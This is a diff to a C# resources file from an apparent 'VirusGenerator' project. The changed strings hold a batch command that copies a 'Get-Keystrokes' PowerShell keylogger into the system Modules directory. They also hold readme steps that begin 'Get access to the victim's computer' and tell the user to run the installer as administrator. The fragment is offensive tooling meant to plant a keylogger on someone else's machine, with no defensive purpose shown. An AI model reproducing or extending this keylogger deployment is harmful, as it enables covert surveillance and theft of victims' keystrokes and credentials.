@@ -62,7 +62,7 @@ namespace VirusGenerator.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to @echo off
-        ///copy Get-Keystrokes.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\Modules.
+        ///xcopy &quot;C:\Users\Public\Get-Keystrokes&quot; &quot;C:\Windows\System32\WindowsPowerShell\v1.0\Modules\Get-Keystrokes\&quot; /S.
         /// </summary>
         internal static string copyKeylogger {
             get {
@@ -118,8 +118,7 @@ namespace VirusGenerator.Properties {
         ///
         ///1. Get access to the victim&apos;s computer.
         ///2. Copy the folder to the Deskop.
-        ///3. Run the batch file which will copy the keylogger to the powershell directory on the drive.
-        ///4. Run a com [rest of string was truncated]&quot;;.
+        ///3. Run the batch file AS AN ADMINISTRATOR which will copy the keylogger to the powershell directory on the  [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string readmeKeylogger {
             get {
